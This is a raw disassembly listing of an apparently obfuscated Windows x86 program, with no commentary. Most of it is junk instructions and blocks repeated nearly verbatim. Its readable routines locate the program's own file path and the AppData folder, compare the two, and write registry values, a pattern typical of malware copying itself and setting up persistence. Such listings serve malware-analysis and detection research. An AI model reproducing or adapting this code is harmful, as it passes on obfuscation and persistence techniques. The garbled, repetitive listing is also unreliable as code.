sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13b7eb
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14775
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba360
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b31c
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40307e
jae r-xdata
push esp
push edx
call sub_402ff0
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120b2b9
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb292
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f1c2
ja r-xdata
jmp 0xffffffffe728880b
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x362887bb
jno r-xdata
jno 0xffffffffff13b7eb
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14775
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba360
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b31c
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_403153
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_403153
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_40318b
jne 0xffffffffa3a517fe
push esi
push esi
pushfd
call sub_40317c
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ ecx ] bl
xor al [ eax ]
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3813
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864d6b2
mov ecx 0x850fef7f
push ebp
call sub_4031af
jns 0xffffffffc2c13b19
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_4031d2
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_4031ca
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f69e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403203
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea edx [ ebp - 0x54 ]
add edx 0xffffed1b
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x58 ] 0x400
mov edx [ ebp - 0x90 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x58 ] 0x400
mov eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x94 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x60 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x94 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_40318b
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3813
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864d6b2
mov ecx 0x850fef7f
push ebp
call sub_4031af
jns 0xffffffffc2c13b19
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_4031d2
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_4031ca
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f69e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403203
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea edx [ ebp - 0x54 ]
add edx 0xffffed1b
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x58 ] 0x400
mov edx [ ebp - 0x90 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x58 ] 0x400
mov eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x94 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x60 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x94 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4031ca
push ebx
push eax
call sub_4031d2
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_4031ca
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f69e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403203
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea edx [ ebp - 0x54 ]
add edx 0xffffed1b
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x58 ] 0x400
mov edx [ ebp - 0x90 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x58 ] 0x400
mov eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x94 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x60 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x94 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4031d2
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_4031ca
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8288531
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f69e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403203
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x84 ] edx
lea edx [ ebp - 0x54 ]
add edx 0xffffed1b
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x88 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
cmp [ ebp - 0x84 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x88 ] ecx
ja r-xdata
mov [ ebp - 0x58 ] 0x400
mov edx [ ebp - 0x90 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x58 ] 0x400
mov eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x94 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x8c ] edx
jbe r-xdata
mov edx [ ebp - 0x60 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x94 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_403370
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
push 0x0
lea eax [ ebp - 0x414 ]
push eax
call sub_411230
add esp 0xc
push 0x104
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
call sub_411230
add esp 0xc
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push 0x0
call [ GetModuleFileNameW@IAT ]
mov [ ebp - 0x484 ] eax
push 0x0
push 0x1a
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea ecx [ ebp - 0x20c ]
push ecx
call [ lstrlenW@IAT ]
mov [ ebp - 0x468 ] eax
mov edx 0x5c
mov eax [ ebp - 0x468 ]
mov [ ebp + eax * 2 - 0x20c ] dx
mov ecx [ ebp + 0xc ]
push ecx
call [ lstrlenW@IAT ]
shl eax 0x1
push eax
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x468 ]
lea ecx [ ebp + eax * 2 - 0x20a ]
push ecx
call sub_4117a0
add esp 0xc
mov [ ebp - 0x464 ] eax
mov [ ebp - 0x460 ] ecx
mov [ ebp - 0x45c ] edx
push ecx
push eax
push esi
push esp
push ebx
push esi
call sub_4034f5
retn 0x50
sub_403485
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_403485
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_4034bd
jne 0xffffffffa3a51b30
push esi
push esi
pushfd
call sub_4034ae
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ ebx + 0x35 ] cl
inc eax
add [ ebx + 0x57704ec ] al
jmp 0xffffffff894f3b45
sub_4034bd
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3b45
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864d9e4
mov ecx 0x850fef7f
push ebp
call sub_4034e1
jns 0xffffffffc2c13e4b
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_403504
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_4034fc
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f9d0
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403535
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x464 ]
mov ecx [ ebp - 0x460 ]
mov edx [ ebp - 0x45c ]
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0x414 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x463 ] eax
mov [ ebp - 0x45f ] ecx
mov [ ebp - 0x45b ] edx
push esi
push ebp
push esi
call sub_403643
retn 0x10
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4034f5
sub esp 0x8
jne r-xdata
push ecx
push ebx
call sub_4034fc
mov ecx 0x18244483
push es
and edi 0x1e85053
add [ eax ] al
add [ ecx + ebx * 2 - 0x7efd82a7 ] bh
r-xdata
jae r-xdata
or eax 0xc181027d
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8288863
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f9d0
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403535
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x464 ]
mov ecx [ ebp - 0x460 ]
mov edx [ ebp - 0x45c ]
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0x414 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x463 ] eax
mov [ ebp - 0x45f ] ecx
mov [ ebp - 0x45b ] edx
push esi
push ebp
push esi
call sub_403643
retn 0x10
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4034fc
push ebx
push eax
call sub_403504
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_4034fc
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f9d0
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403535
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x464 ]
mov ecx [ ebp - 0x460 ]
mov edx [ ebp - 0x45c ]
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0x414 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x463 ] eax
mov [ ebp - 0x45f ] ecx
mov [ ebp - 0x45b ] edx
push esi
push ebp
push esi
call sub_403643
retn 0x10
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_403504
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_4034fc
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8288863
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f9d0
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403535
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x464 ]
mov ecx [ ebp - 0x460 ]
mov edx [ ebp - 0x45c ]
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0x414 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x463 ] eax
mov [ ebp - 0x45f ] ecx
mov [ ebp - 0x45b ] edx
push esi
push ebp
push esi
call sub_403643
retn 0x10
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4035b8
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846a710
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35ad14
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
push ebp
push esp
sub esp 0x8
call sub_4035e4
jae 0x5a76245e
or ecx 0x30246c81
mov al [ 0xffffffff83004035 ]
in al dx
add al 0x73
adc al [ ecx - 0x16fe8c0d ]
push ebx
jmp 0xffffffff83948b2b
push edx
push ebp
sub esp 0xc
call sub_403609
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
cwde
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3c93
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864a270
add al [ ebx + 0x77d04ec ]
sub_4035e4
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x4864a270
push edx
push ebp
sub esp 0xc
call sub_403609
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
cwde
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3c93
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_403609
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc38b50
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f3c93
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff840024b1
push ebx
call sub_403631
jge 0xffffffff844f409d
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_40365d
jpo 0x59283bd3
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
